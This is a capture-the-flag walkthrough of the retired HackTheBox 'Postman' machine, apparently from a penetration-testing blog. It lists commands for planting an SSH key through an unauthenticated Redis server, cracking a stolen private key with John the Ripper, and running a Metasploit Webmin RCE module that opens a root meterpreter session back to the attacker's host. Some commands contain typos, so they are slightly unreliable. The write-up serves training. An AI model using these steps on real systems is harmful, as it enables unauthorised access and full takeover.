@@ -1,0 +1,101 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">HacktheBox Postman Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-postman-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2020-03-22T18:27:11+00:00">March 22, 2020</time><time class="updated" datetime="2025-06-27T12:03:37+00:00">June 27, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Today, we’re sharing another Hack Challenge Walkthrough box: POSTMAN design by The Cyber Geek and the machine is part of the retired lab, so you can connect to the machine using your HTB VPN and then start to solve the CTF.</span></p>
+<p><span style="color: #000000;">The level of the Lab is set: Beginner to intermediate.</span></p>
+<p><span style="color: #000000;">Task: Capture the user.txt and root.txt flags.</span></p>
+<h3><span style="color: #800000;">Penetration Methodologies</span></h3>
+<ul>
+<li><strong><span style="color: #000000;">Network Scanning</span></strong>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+</li>
+<li><strong><span style="color: #000000;">Enumeration</span></strong>
+<ul>
+<li><span style="color: #000000;">Redis</span></li>
+</ul>
+</li>
+<li><strong><span style="color: #000000;">Initial Foothold</span></strong>
+<ul>
+<li><span style="color: #000000;">Access SSH</span></li>
+</ul>
+</li>
+<li><strong><span style="color: #000000;">Privilege Escalation</span></strong>
+<ul>
+<li><span style="color: #000000;">Webmin</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">As we know the machine IP of the victim, Nmap scans will begin with the identification of open ports and services across them.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p- 10.10.10.160</pre>
+<p><span style="color: #000000;">We find port 80 open for HTTP from this scanning study, and port 22 open for SSH, too. In addition, I have noticed port 1000 for webmin and the port 6379 for Redis is open.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qDrknyedPwk/XnerJzbrRMI/AAAAAAAAjJs/VZm0H2ow0bcmqPDv5oJEiwRn_Tiho6o8ACLcBGAsYHQ/s1600/1.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Enumeration</span> </span></h3>
+<p><span style="color: #000000;">The Redis security model is: “it’s totally insecure to let untrusted clients access the system, the ability to control the server configuration using the CONFIG command makes the client able to change the working directory of the program and the name of the dump file. This allows clients to write RDB Redis files at random paths, that is a security issue that may easily lead to the ability to run untrusted code as the same user as Redis is running”.</span></p>
+<p><span style="color: #000000;">You can read more about it from here</span></p>
+<p><span style="color: #000000;">Since we saw port 6379 is available for Redis, we try to communicate with this with the help of the Redis client.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">redis -cli -h 10.10.10.160
+config get dir</pre>
+<p><span style="color: #000000;">We noticed, that Redis is insecure and not AUTH required. So we discovered “.ssh directory” for the Redis as mentioned above. And due to unsafe configuration we can transfer any file inside the server.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-a-RLoigalPk/XnerK9CmH9I/AAAAAAAAjJ4/S2CnKgx0y7Y1QVzADcUwLzGwRPq9M_ghwCLcBGAsYHQ/s1600/4.png"/></span></p>
+<p><span style="color: #000000;">Further, I generate an ssh key pair using the ssh-keygen command given below:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh-keygen -t rsa -f raj</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Jo3cttqYRuM/XnerLRCOo7I/AAAAAAAAjJ8/mJ0P5D7axMwK-CX86DtJu_OKVq4KF66LQCLcBGAsYHQ/s1600/5.png"/></span></p>
+<p><span style="color: #000000;">I have a key and my goal is to place it in the server memory and then move it to a file in such a way that the authorized keys file that results remains valid.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">(echo -e "\n\n"; cat raj.pub; echo -e "\n\n") &gt; foo.txt
+cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TL1-VMxwNs0/XnerLhzF6aI/AAAAAAAAjKA/-XqXmFEeLawtDY4BRsVGRNqcJVJhhfB-gCLcBGAsYHQ/s1600/6.png"/></span></p>
+<h3><span style="color: #000000;"><strong><span style="color: #800000;">Initial Foothold</span> </strong></span></h3>
+<p><span style="color: #000000;">As we have uploaded our ssh key into server thus it’s time to connect with a remote machine with the help following command</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh -i raj redis@10.10.10.160
+ls -la
+cat .bash_history</pre>
+<p><span style="color: #000000;">Here, we notice two things: first there is a user whose name is  “Matt” and a file with name “id_rsa.bak”, let’s find out the path for this file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-flxynEo0otI/XnerMDrwjEI/AAAAAAAAjKE/yT0oa5W9qHAK0Ycnhd63W58wzeRhxMaFACLcBGAsYHQ/s1600/7.1.png"/></span></p>
+<p><span style="color: #000000;">So, with the help of find command, we enumerate the path for id_rsa.bak file which lie inside /opt directory.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">find /-user Matt 2&gt;/dev/null</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-0KHHeh9vk_g/XnerMBdaiJI/AAAAAAAAjKI/UzoY7__W0Y8w4QKm3TOxEKorT9Nw1jGxQCLcBGAsYHQ/s1600/7.2.png"/></span></p>
+<p><span style="color: #000000;">So id_rsa.bak file is actually the id_rsa private key, I copied it into a text file and saved it as a hash.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-A59MdPcItuo/XnerM_XSHlI/AAAAAAAAjKQ/8BENaZZgm2cSTAlUHWyK5md2s57UnrRDACLcBGAsYHQ/s1600/7.png"/></span></p>
+<p><span style="color: #000000;">Then we have used ssh2john to convert this SSH key into a crackable file with the help of John the ripper and further used the rockyou.txt wordlist for this.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">python /usr/share/john/ssh2john key &gt; sshkey &gt; hash
+john --wordlist=/usr/share/wordlists/rockyou.txt hash</pre>
+<p><span style="color: #000000;">Hmmm!! so we have obtained ssh key “computer2008” for the user Matt.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Z81W66ejNDw/XnerM1lbVUI/AAAAAAAAjKM/gt0F_6Vwu8U7uziWXQvIVfXnsOVT_mcfwCLcBGAsYHQ/s1600/8.png"/></span></p>
+<p><span style="color: #000000;">As we knew that webmin was running over port 10000 thus we navigate to a web browser and explore the URL where we submit above-enumerated creds.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://10.10.10.160:10000
+username: Matt
+Password: computer2008</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-E_tuyZ8K4GM/XnerNQ4JbnI/AAAAAAAAjKU/rNzglCeheIYhxUEYoe-otG2FwmPrn4vkwCLcBGAsYHQ/s1600/9.png"/></span></p>
+<p><span style="color: #000000;">Boom! We logged in successfully and notice the installed version for webmin i.e. 1.910; now we can search for its exploit if available.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-N-y9H_DZSyE/XnerJ8ybSMI/AAAAAAAAjJo/WWnx5eC7MIg1h_IMH1pHu1fqnWgJq24TgCLcBGAsYHQ/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">With the help of searchsploit, we found a Metasploit module for exploiting remote command execution. This module exploits an arbitrary command execution vulnerability in Webmin 1.910 and lower versions. Any user authorized to the “Package Updates” module can execute arbitrary commands with root privileges.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RvR4_j3ZVJY/XnerJvbFwmI/AAAAAAAAjJk/g7kevuUGhXwvu_iGl7FkcTaJs3Xr-ctygCLcBGAsYHQ/s1600/11.png"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Privilege Escalation</span> </span></h3>
+<p><span style="color: #000000;">Without wasting time, we loaded the Metasploit module and set the value required to initialize the exploit.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use exploit/linux/http/webmin_packageup_rce
+msf exploit(webmin_packageup_rce) &gt; set rhosts 10.10.10.160
+msf exploit(webmin_packageup_rce) &gt;set lhost 10.10.15.243
+msf exploit(webmin_packageup_rce) &gt;set username Matt
+msf exploit(webmin_packageup_rce) &gt;set password computer2008
+msf exploit(webmin_packageup_rce) &gt;set ssl true
+msf exploit(webmin_packageup_rce) &gt;exploit</pre>
+<p><span style="color: #000000;">We got the meterpreter session with root privilege, let’s enumerate flags.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-kXyf9XTHi7w/XnerKqw8-0I/AAAAAAAAjJw/RFwIHM0sqVYjnwpIkxa46aH1MNMkCe6PwCLcBGAsYHQ/s1600/12.png"/></span></p>
+<p><span style="color: #000000;">Let’s capture both flags user.txt and root.txt from inside the /home/Matt/ and /root respectively.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">cat /root/root.txt
+cat /home/Matt/user.txt</pre>
+<p><span style="color: #000000;">Conclusion: In this machine, we have learned about two major vulnerability and their exploitation, the first was insure Redis and the other was webmin.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-yZDpny0tYho/XnerK9gRkhI/AAAAAAAAjJ0/xb4PMJ1gjiQb0MdwnossyLug9KRkfI2TwCLcBGAsYHQ/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Contact on <strong>Twitter</strong> and <strong><a style="color: #000000;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
